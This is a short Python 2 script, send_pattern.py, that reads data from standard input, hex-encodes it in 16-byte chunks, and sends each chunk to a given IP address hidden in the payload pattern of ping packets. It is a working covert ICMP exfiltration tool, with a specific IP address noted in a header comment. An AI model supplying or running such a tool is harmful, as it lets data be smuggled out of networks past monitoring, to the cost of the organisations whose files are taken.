#212.24.108.72
import subprocess
import sys
import binascii
#####################################
#       ---=== USAGE ===---
#   python send_pattern.py [ip]
#
#
#####################################
ip = sys.argv[1]
data='start'
while data!='':
    data = sys.stdin.read(16)
    hex_data = binascii.hexlify(data)
    print data
    print subprocess.check_output(['ping','-c','1', '-p',hex_data,ip])
